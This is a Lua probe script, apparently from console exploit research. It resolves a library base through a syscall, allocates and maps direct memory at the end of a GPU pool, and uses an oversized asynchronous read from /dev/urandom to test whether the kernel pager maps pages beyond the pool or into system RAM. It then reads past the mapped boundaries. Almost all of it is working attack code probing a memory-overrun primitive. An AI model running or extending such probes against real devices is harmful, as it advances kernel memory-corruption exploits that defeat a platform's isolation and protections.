-- CRASH_CLASS: MODERATE
-- PROBE 533b: AIO overrun on dmem0 mapping near pool boundary
--
-- DEM9N101 showed: AIO with count=0x4000 into 1-page dmem0 mapping
-- causes overrun — pager faults extra device pages on demand.
-- Count >= 0x10000 returns error 0x8002000E.
--
-- Question: What if we allocate at the END of the GPU pool
-- (near 0x150000000) and do AIO overrun? Would the pager
-- fault in pages BEYOND the pool? Could we reach system RAM?
--
-- Plan:
-- 1. AllocateDirectMemory at pool end (searchStart=0x14FFF0000)
-- 2. Map it via mmap_dmem(628)  
-- 3. Use AIO to read from /dev/urandom into the mapped page
--    with count larger than page size
-- 4. Check if overrun pages are readable and contain non-zero data
--
-- Also: map the last page of the pool and check behavior.

print("=== PROBE 533b: AIO DMEM OVERRUN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
local error_fn = lk + uint64(0x02E10)
local alloc_fn = lk + uint64(0x17EF0)

local function get_errno()
    local errno_val = -1
    pcall(function()
        local errno_ptr = native.fcall_with_rax(error_fn, 0)
        if errno_ptr and to_num(errno_ptr) ~= 0 then
            errno_val = rd(to_num(errno_ptr)) or -1
        end
    end)
    return errno_val
end

local sc_628 = make_syscall(628)
local sc_669 = make_syscall(669)
local sc_664 = make_syscall(664)

print("lk=" .. q(lk))

-- [A] Allocate at pool end
print("")
print("[A] Allocate near pool end")

-- Pool is 0x100000000-0x150000000
-- Try to get the very last pages
local last_phys_buf = memory.alloc(8); wq(last_phys_buf, uint64(0))
local ok_a, rv_a = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64("0x14FFC0000"), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(last_phys_buf))
end)
local last_phys = rq(last_phys_buf)
print(string.format("  rv=%d phys=%s", to_num(rv_a), q(last_phys)))

-- Also allocate a larger block near pool end
local big_phys_buf = memory.alloc(8); wq(big_phys_buf, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64("0x14F000000"), uint64("0x150000000"), uint64(0x40000),
        uint64(0x4000), uint64(0), uint64(big_phys_buf))
end)
local big_phys = rq(big_phys_buf)
print("  big_phys=" .. q(big_phys))

-- Map both via mmap_dmem(628)
local ok_m1, va1 = pcall(function()
    return sc_628(uint64(0), uint64(0x4000), uint64("0xFFFFFFFFFFFFFFFF"),
        uint64(3), uint64(0), last_phys)
end)
print("  last_va=" .. (ok_m1 and q(va1) or "fail"))

local ok_m2, va2 = pcall(function()
    return sc_628(uint64(0), uint64(0x40000), uint64("0xFFFFFFFFFFFFFFFF"),
        uint64(3), uint64(0), big_phys)
end)
print("  big_va=" .. (ok_m2 and q(va2) or "fail"))

-- [B] Try to read PAST the mapped region
-- If the pager extends into unmapped territory, these reads might work
print("")
print("[B] Read past mapped boundaries")

if ok_m1 and to_num(va1) > 0 then
    print("  Reading past last_va (1 page mapped):")
    for page = 0, 3 do
        local addr = va1 + uint64(page * 0x4000)
        local ok_r, val = pcall(function() return memory.read_dword(addr) end)
        if ok_r then
            local vn = to_num(val); if vn < 0 then vn = vn + 0x100000000 end
            print(string.format("    +%dpage: 0x%08X (READABLE!)", page, vn))
        else
            print(string.format("    +%dpage: FAULT", page))
        end
    end
end

-- [C] AIO: read /dev/urandom into mapped dmem page with overrun
print("")
print("[C] AIO overrun test")

-- Open /dev/urandom
local function write_string(buf, str)
    for pos = 0, #str - 1, 4 do
        local val = 0
        for bi = 0, 3 do
            local ci = pos + bi + 1
            if ci <= #str then
                val = val + string.byte(str, ci) * (256 ^ bi)
            end
        end
        wd(buf + pos, val)
    end
end

local urand_path = memory.alloc(32); write_string(urand_path, "/dev/urandom\0")
local ok_u, urand_fd = pcall(function()
    return make_syscall(5)(uint64(urand_path), uint64(0), uint64(0))
end)
local urand_fdn = to_num(urand_fd)
print("  urandom_fd=" .. urand_fdn)

if ok_m2 and to_num(va2) > 0 and urand_fdn >= 0 then
    -- Zero the big mapping
    for off = 0, 0x3FFFC, 4 do wd(va2 + off, 0) end
    
    -- AIO read from urandom into big mapping (256KB)
    -- AIO struct stride = 0x28
    -- +0x00: cmd (1=read, 2=write)
    -- +0x04: fd
    -- +0x08: destination VA
    -- +0x10: count
    -- +0x18: offset
    -- +0x20: result
    local aio_req = memory.alloc(0x40)
    zero(aio_req, 0x40)
    wd(aio_req + 0x00, 1)            -- cmd=read
    wd(aio_req + 0x04, urand_fdn)    -- fd=urandom
    wq(aio_req + 0x08, va2)          -- dest=our mapped page
    wq(aio_req + 0x10, uint64(0x40000))  -- count=256KB (our mapping size)
    wq(aio_req + 0x18, uint64(0))    -- offset=0
    wd(aio_req + 0x20, 0)            -- result=0

    local aio_ids = memory.alloc(8); wd(aio_ids, 0)
    
    -- Submit
    local ok_s, rv_s = pcall(function()
        return sc_669(uint64(1), uint64(aio_req), uint64(1), uint64(1), uint64(aio_ids))
    end)
    print("  submit rv=" .. (ok_s and tostring(to_num(rv_s)) or "fail"))
    
    -- Wait a bit
    local ts = memory.alloc(16); wq(ts, 0); wq(ts + 8, uint64(200000000))
    pcall(function() make_syscall(240)(uint64(ts), uint64(0)) end)
    
    -- Poll
    local poll_out = memory.alloc(0x40); zero(poll_out, 0x40)
    wd(poll_out, rd(aio_ids) or 0)
    pcall(function() sc_664(uint64(poll_out), uint64(1), uint64(0), uint64(0), uint64(0)) end)
    local aio_state = rd(poll_out + 4) or 0
    local aio_result = rd(aio_req + 0x20) or 0
    if aio_result < 0 then aio_result = aio_result + 0x100000000 end
    print(string.format("  state=%d result=0x%X", aio_state, aio_result))
    
    -- Check how much was actually written
    local written_pages = 0
    for page = 0, 63 do
        local v = rd(va2 + page * 0x1000)
        if v and v ~= 0 then
            written_pages = written_pages + 1
        end
    end
    print("  non-zero 4K pages in 256KB mapping: " .. written_pages)
    
    -- Now the key test: try to read PAST the 256KB mapping
    -- If AIO extended the mapping, pages after +0x40000 might be readable
    print("  Reading past 256KB boundary:")
    for extra = 0, 7 do
        local addr = va2 + uint64(0x40000 + extra * 0x4000)
        local ok_r, val = pcall(function() return memory.read_dword(addr) end)
        if ok_r then
            local vn = to_num(val); if vn < 0 then vn = vn + 0x100000000 end
            print(string.format("    +0x%X: 0x%08X (PAST MAPPING - READABLE!)", 0x40000 + extra * 0x4000, vn))
        else
            print(string.format("    +0x%X: FAULT (expected)", 0x40000 + extra * 0x4000))
        end
    end
end

print("")
print("=== 533b DONE ===")
